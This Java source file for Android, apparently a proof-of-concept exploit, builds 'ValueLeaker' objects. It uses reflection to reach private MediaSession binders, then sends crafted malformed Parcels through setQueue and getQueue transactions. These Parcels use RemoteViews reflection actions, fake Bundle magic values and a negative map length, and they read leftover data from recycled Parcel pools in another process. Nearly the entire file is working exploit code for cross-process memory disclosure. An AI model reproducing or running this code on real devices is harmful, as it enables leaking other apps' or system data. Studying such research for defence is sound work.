package com.example.leakvalue;

import android.annotation.SuppressLint;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.media.session.MediaController;
import android.media.session.MediaSession;
import android.os.Binder;
import android.os.IBinder;
import android.os.IInterface;
import android.os.Message;
import android.os.Parcel;
import android.os.RemoteException;
import android.widget.RemoteViews;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.function.IntConsumer;

public class ValueLeakerMaker {

    private final Object mMediaSessionBinder;
    private final Method mGetBinderForSetQueue;
    private final IBinder mControllerBinder;
    private final int mGetQueueCode;
    private final boolean mBitmapCacheHasHashes;

    /** Binder.getSuggestedMaxIpcSizeBytes() */
    private static final int SUGGESTED_MAX_IPC = 64 * 1024;

    private static final String FILLER_PACKAGE_NAME = aaaa(SUGGESTED_MAX_IPC);
    private static final String FILLER_PACKAGE_NAME_HALF = aaaa(SUGGESTED_MAX_IPC / 2);

    private static final long END_MAGIC = 0xA1A2A3A4A5A60000L;

    @SuppressLint("SoonBlockedPrivateApi")
    public ValueLeakerMaker(Context context) throws ReflectiveOperationException {
        MediaSession mediaSession = new MediaSession(context, "LeakValue");
        Field sessionBinderField = MediaSession.class.getDeclaredField("mBinder");
        sessionBinderField.setAccessible(true);
        mMediaSessionBinder = sessionBinderField.get(mediaSession);
        mGetBinderForSetQueue = mMediaSessionBinder.getClass().getMethod("getBinderForSetQueue");

        MediaController controller = mediaSession.getController();
        Field controllerBinderField = MediaController.class.getDeclaredField("mSessionBinder");
        controllerBinderField.setAccessible(true);
        mControllerBinder = ((IInterface) controllerBinderField.get(controller)).asBinder();

        Field getQueueCodeField = Class.forName("android.media.session.ISessionController$Stub")
                .getDeclaredField("TRANSACTION_getQueue");
        getQueueCodeField.setAccessible(true);
        mGetQueueCode = getQueueCodeField
                .getInt(null);

        // Check if RemoteViews$BitmapCache.mBitmapHashes is written to Parcel
        Parcel bitmapCacheProbeParcel = Parcel.obtain();
        bitmapCacheProbeParcel.writeInt(0);
        bitmapCacheProbeParcel.writeInt(0);
        int sizeOfTwoInts = bitmapCacheProbeParcel.dataPosition();
        bitmapCacheProbeParcel.setDataPosition(0);
        Constructor<?> bitmapCacheConstructor = Class.forName("android.widget.RemoteViews$BitmapCache")
                .getConstructor(Parcel.class);
        bitmapCacheConstructor.setAccessible(true);
        bitmapCacheConstructor.newInstance(bitmapCacheProbeParcel);
        mBitmapCacheHasHashes = bitmapCacheProbeParcel.dataPosition() >= sizeOfTwoInts;
        bitmapCacheProbeParcel.recycle();
    }

    private static String aaaa(int len) {
        return new String(new byte[len]).replace('\0', 'A');
    }

    private int writeRemoteViews(Parcel data, int leakDataSize) {
        boolean isFiller = leakDataSize == 0;

        int startPos = data.dataPosition();
        int endPos = startPos;

        // BEGIN RemoteViews
        data.writeInt(0); // MODE_NORMAL
        data.writeInt(0); // mBitmapCache.size()
        if (mBitmapCacheHasHashes) data.writeInt(0);
        ApplicationInfo applicationInfo = new ApplicationInfo();
        applicationInfo.packageName = isFiller ? FILLER_PACKAGE_NAME : "";
        applicationInfo.writeToParcel(data, 0);
        data.writeInt(0); // mIdealSize == null
        data.writeInt(0); // mLayoutId
        data.writeInt(0); // mViewId
        data.writeInt(0); // mLightBackgroundLayoutId
        if (isFiller) {
            data.writeInt(0); // mActions.size()
        } else {
            data.writeInt(1); // mActions.size()
            // BEGIN mActions[0]
            data.writeInt(2); // REFLECTION_ACTION_TAG
            data.writeInt(0); // viewId
            data.writeInt(-1); // methodName
            data.writeInt(13); // type=BUNDLE
            // BEGIN Parcel.readBundle()
            data.writeInt(4); // Bundle length (ignored as actual length due to read helper presence)
            data.writeInt(0x4C444E42); // BUNDLE_MAGIC
            data.writeInt(1); // Number of key-value pairs in Bundle
            data.writeInt(-1); // Key
            endPos = data.dataPosition();
            data.writeInt(4); // VAL_PARCELABLE
            data.writeInt(leakDataSize - 8);
            for (int i = 8; i < leakDataSize; i += 4) {
                data.writeInt(0);
            }
            // END Parcel.readBundle()
            // END mActions[0]
        }
        data.writeInt(0); // mApplyFlags
        data.writeLong(isFiller ? 0 : END_MAGIC); // mProviderInstanceId
        // END RemoteViews
        return endPos - startPos;
    }

    private void readIntAndCheck(Parcel source, int expectedValue, String name) {
        int actual = source.readInt();
        if (actual != expectedValue) {
            throw new RuntimeException("Unexpected <" + name + "> in reply, expected <" + expectedValue + ">, got <" + actual + ">");
        }
    }

    private void readStringAndCheck(Parcel source, String expectedValue, String name) {
        String actual = source.readString();
        if (!actual.equals(expectedValue)) {
            throw new RuntimeException("Unexpected <" + name + "> in reply, expected <" + expectedValue + ">, got <" + actual + ">");
        }
    }

    /**
     * Create {@link ValueLeaker} allowing retrieving data from recycled Parcel
     * in {@code Parcel.sHolderPool} (used for incoming Binder transactions)
     */
    public ValueLeaker makeHolderLeaker(int leakDataSize) throws ReflectiveOperationException, RemoteException {
        if (leakDataSize < 8 || leakDataSize % 4 != 0) {
            throw new IllegalArgumentException();
        }

        IBinder setQueueBinder = (IBinder) mGetBinderForSetQueue.invoke(mMediaSessionBinder);
        {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInt(2); // List length
            data.writeInt(1); // ParcelableListBinder.ITEM_CONTINUED
            data.writeString("android.widget.RemoteViews");
            writeRemoteViews(data, 0);
            data.writeInt(0); // ParcelableListBinder.END_OF_PARCEL
            setQueueBinder.transact(IBinder.FIRST_CALL_TRANSACTION, data, null, 0);
            reply.recycle();
            data.recycle();
        }

        int offsetToLeakedData;
        {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInt(1); // ParcelableListBinder.ITEM_CONTINUED
            data.writeString("android.widget.RemoteViews");
            offsetToLeakedData = writeRemoteViews(data, leakDataSize);
            setQueueBinder.transact(IBinder.FIRST_CALL_TRANSACTION, data, null, 0);
            reply.recycle();
            data.recycle();
        }

        IBinder retriever;
        {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInterfaceToken("android.media.session.ISessionController");
            mControllerBinder.transact(mGetQueueCode, data, reply, 0);
            reply.readException();
            readIntAndCheck(reply, 1, "PLS != null");
            readIntAndCheck(reply, 2, "PLS.size()");
            readStringAndCheck(reply, "android.widget.RemoteViews", "PLS item type");
            readIntAndCheck(reply, 1, "First item presence");
            RemoteViews.CREATOR.createFromParcel(reply);
            readIntAndCheck(reply, 0, "Second item presence");
            retriever = reply.readStrongBinder();
            reply.recycle();
            data.recycle();
        }

        return new ValueLeaker(retriever, offsetToLeakedData + 4, leakDataSize, ValueLeakerMaker.END_MAGIC);
    }

    /**
     * Create {@link ValueLeaker} allowing retrieving data from recycled Parcel
     * in {@code Parcel.sHolderPool} (used for incoming Binder transactions)
     * and use LazyValue with negative length to be able to reach earlier bytes in that Parcel
     */
    public ValueLeaker makeHolderLeakerWithRewind(int leakDataSize) throws ReflectiveOperationException, RemoteException {
        // Tested only with leakDataSize=56
        if (leakDataSize < 8 || leakDataSize % 4 != 0) {
            throw new IllegalArgumentException();
        }

        IBinder setQueueBinder = (IBinder) mGetBinderForSetQueue.invoke(mMediaSessionBinder);
        {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInt(2); // List length
            data.writeInt(1); // ParcelableListBinder.ITEM_CONTINUED
            data.writeString("android.os.Message");
            Message message = Message.obtain();
            message.obj = new ComponentName(FILLER_PACKAGE_NAME_HALF, "");
            message.writeToParcel(data, 0);
			message.recycle();
            data.writeInt(0); // ParcelableListBinder.END_OF_PARCEL
            setQueueBinder.transact(IBinder.FIRST_CALL_TRANSACTION, data, null, 0);
            reply.recycle();
            data.recycle();
        }

        int offsetToLeakedData;
        {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInt(1); // ParcelableListBinder.ITEM_CONTINUED
            data.writeString("android.os.Message");
            data.writeInt(4); // msg.what / readValue() type
            data.writeInt(leakDataSize - 8); // msg.arg1 / readValue() size
            data.writeInt(1); // msg.arg2 / readParcelable() name length
            data.writeInt('.'); // msg.obj != null / readParcelable() name text
            data.writeString("android.widget.RemoteViews");

            // BEGIN RemoteViews
            data.writeInt(0); // MODE_NORMAL
            data.writeInt(0); // mBitmapCache.size()
            if (mBitmapCacheHasHashes) data.writeInt(0);
            ApplicationInfo applicationInfo = new ApplicationInfo();
            applicationInfo.packageName = "";
            applicationInfo.writeToParcel(data, 0);
            data.writeInt(0); // mIdealSize == null
            data.writeInt(22); // mLayoutId
            data.writeInt(33); // mViewId
            data.writeInt(0); // mLightBackgroundLayoutId
            data.writeInt(1); // mActions.size()
            // BEGIN mActions[0]
            data.writeInt(2); // REFLECTION_ACTION_TAG
            data.writeInt(0); // viewId
            data.writeInt(-1); // methodName
            data.writeInt(13); // type=BUNDLE
            // BEGIN Parcel.readBundle()
            data.writeInt(4); // Bundle length (ignored as actual length due to read helper presence)
            data.writeInt(0x4C444E44); // BUNDLE_MAGIC_NATIVE
            data.writeInt(2); // Number of key-value pairs in Bundle
            offsetToLeakedData = data.dataPosition(); // TODO

            // BEGIN First Bundle key-value pair
            data.writeString("%$#@!");
            data.writeInt(2); // VAL_MAP
            data.writeInt(-data.dataPosition());
            data.writeInt(0); // Number of items in VAL_MAP
            // END First Bundle key-value pair
            // Reader has rewound, abandon writing

            setQueueBinder.transact(IBinder.FIRST_CALL_TRANSACTION, data, null, 0);
            reply.recycle();
            data.recycle();
        }

        IBinder retriever;
        {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInterfaceToken("android.media.session.ISessionController");
            mControllerBinder.transact(mGetQueueCode, data, reply, 0);
            reply.readException();
            readIntAndCheck(reply, 1, "PLS != null");
            readIntAndCheck(reply, 2, "PLS.size()");
            readStringAndCheck(reply, "android.os.Message", "PLS item type");
            readIntAndCheck(reply, 1, "First item presence");
            Message.CREATOR.createFromParcel(reply).recycle();
            readIntAndCheck(reply, 0, "Second item presence");
            retriever = reply.readStrongBinder();
            reply.recycle();
            data.recycle();
        }

        return new ValueLeaker(retriever, offsetToLeakedData, leakDataSize, 0x40002300240025L);
    }

    /**
     * Create {@link ValueLeaker} allowing retrieving data from recycled Parcel
     * in {@code Parcel.sOwnedPool} (used for outgoing Binder transactions, parcelled Bundles
     * and other uses of {@code Parcel.obtain()})
     */
    public ValueLeaker makeOwnedLeaker(int leakDataSize) throws ReflectiveOperationException, RemoteException {
        if (leakDataSize < 8 || leakDataSize % 4 != 0) {
            throw new IllegalArgumentException();
        }

        IBinder setQueueBinder = (IBinder) mGetBinderForSetQueue.invoke(mMediaSessionBinder);
        int[] offsetToLeakedData = new int[1];
        {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInt(1); // List length
            data.writeInt(1); // ParcelableListBinder.ITEM_CONTINUED
            data.writeString("android.content.pm.ParceledListSlice");
            data.writeInt(2); // PLS.size()
            data.writeString("android.widget.RemoteViews");
            data.writeInt(1); // Item present inline
            writeRemoteViews(data, 0);
            data.writeInt(0); // End of inline items
            data.writeStrongBinder(new Binder() {
                @Override
                protected boolean onTransact(int code, @NonNull Parcel data, @Nullable Parcel reply, int flags) throws RemoteException {
                    if (code == IBinder.FIRST_CALL_TRANSACTION) {
                        reply.writeInt(1);
                        offsetToLeakedData[0] = writeRemoteViews(reply, leakDataSize);
                        return true;
                    }
                    return super.onTransact(code, data, reply, flags);
                }
            });
            setQueueBinder.transact(IBinder.FIRST_CALL_TRANSACTION, data, null, 0);
            reply.recycle();
            data.recycle();
        }

        IBinder retriever;
        {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInterfaceToken("android.media.session.ISessionController");
            mControllerBinder.transact(mGetQueueCode, data, reply, 0);
            reply.readException();
            readIntAndCheck(reply, 1, "Outer PLS != null");
            readIntAndCheck(reply, 1, "Outer PLS.size()");
            readStringAndCheck(reply, "android.content.pm.ParceledListSlice", "Outer PLS item type");
            readIntAndCheck(reply, 1, "Inner PLS != null");
            readIntAndCheck(reply, 2, "Inner PLS.size()");
            readStringAndCheck(reply, "android.widget.RemoteViews", "Inner PLS item type");
            readIntAndCheck(reply, 1, "First item presence");
            RemoteViews.CREATOR.createFromParcel(reply);
            readIntAndCheck(reply, 0, "Second item presence");
            retriever = reply.readStrongBinder();
            reply.recycle();
            data.recycle();
        }

        return new ValueLeaker(retriever, offsetToLeakedData[0] + 4, leakDataSize, ValueLeakerMaker.END_MAGIC);
    }

    /**
     * Execute provided callback with various amount of Parcel.obtain() which will be Parcel.recycle()'d
     * after callback returns
     */
    void runWithNestLevelsOfOwnedParcels(int maxLevel, IntConsumer callback) throws InvocationTargetException, IllegalAccessException, RemoteException {
        if (maxLevel < 0) {
            throw new IllegalArgumentException();
        }
        callback.accept(0);
        if (maxLevel >= 1) {
            Thread thread = Thread.currentThread();
            IBinder setQueueBinder = (IBinder) mGetBinderForSetQueue.invoke(mMediaSessionBinder);
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInt(2); // List length
            data.writeInt(1); // ParcelableListBinder.ITEM_CONTINUED
            data.writeString("android.content.pm.ParceledListSlice");
            data.writeInt(1); // PLS.size()
            data.writeString(maxLevel > 1 ? "android.content.pm.ParceledListSlice" : "android.content.ComponentName");
            data.writeInt(0); // End of inline items
            data.writeStrongBinder(new Binder() {
                int currentLevelF;

                @Override
                protected boolean onTransact(int code, @NonNull Parcel data, @Nullable Parcel reply, int flags) throws RemoteException {
                    if (code == IBinder.FIRST_CALL_TRANSACTION && thread == Thread.currentThread()) {
                        int currentLevel = ++currentLevelF;
                        callback.accept(currentLevel);
                        reply.writeInt(1); // Item present
                        if (currentLevel >= maxLevel) {
                            reply.writeString("");
                            reply.writeString("");
                        } else  {
                            reply.writeInt(1); // PLS.size()
                            reply.writeString(currentLevel < maxLevel - 1 ? "android.content.pm.ParceledListSlice" : "android.content.ComponentName");
                            reply.writeInt(0); // End of inline items
                            reply.writeStrongBinder(this);
                        }
                        return true;
                    }
                    return super.onTransact(code, data, reply, flags);
                }
            });
            setQueueBinder.transact(IBinder.FIRST_CALL_TRANSACTION, data, null, 0);
            reply.recycle();
            data.recycle();
        }
    }

    /**
     * Execute provided callback with various amount of Parcel.obtain() and Parcel.obtain(long)
     * which will be Parcel.recycle()'d after callback returns
     */
    public void runWithNestLevels(int maxLevel, IntConsumer callback) throws InvocationTargetException, IllegalAccessException, RemoteException {
        if (maxLevel < 0) {
            throw new IllegalArgumentException();
        }
        callback.accept(0);
        if (maxLevel >= 1) {
            Thread thread = Thread.currentThread();
            IBinder setQueueBinder = (IBinder) mGetBinderForSetQueue.invoke(mMediaSessionBinder);
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInt(maxLevel + 1); // List length
            data.writeInt(1); // ParcelableListBinder.ITEM_CONTINUED
            data.writeString("android.content.pm.ParceledListSlice");
            data.writeInt(1); // PLS.size()
            data.writeString("android.content.ComponentName");
            data.writeInt(0); // End of inline items
            data.writeStrongBinder(new Binder() {
                int currentLevelF;
                boolean done;

                @Override
                protected boolean onTransact(int code, @NonNull Parcel thisData, @Nullable Parcel thisReply, int flags) throws RemoteException {
                    if (code == IBinder.FIRST_CALL_TRANSACTION) {
                        try {
                            thisReply.writeInt(1); // Item present
                            thisReply.writeString("");
                            thisReply.writeString("");
                            int currentLevel = ++currentLevelF;
                            if (!done && thread == Thread.currentThread()) {
                                callback.accept(currentLevel);
                                if (currentLevel < maxLevel) {
                                    Parcel data = Parcel.obtain();
                                    Parcel reply = Parcel.obtain();
                                    data.writeInt(maxLevel + 1); // List length
                                    data.writeInt(1); // ParcelableListBinder.ITEM_CONTINUED
                                    data.writeString("android.content.pm.ParceledListSlice");
                                    data.writeInt(1); // PLS.size()
                                    data.writeString("android.content.ComponentName");
                                    data.writeInt(0); // End of inline items
                                    data.writeStrongBinder(this);
                                    setQueueBinder.transact(IBinder.FIRST_CALL_TRANSACTION, data, null, 0);
                                    data.recycle();
                                    reply.recycle();
                                }
                            }
                        } finally {
                            done = true;
                        }
                        return true;
                    }
                    return super.onTransact(code, thisData, thisReply, flags);
                }
            });
            setQueueBinder.transact(IBinder.FIRST_CALL_TRANSACTION, data, null, 0);
            reply.recycle();
            data.recycle();
        }
    }
}
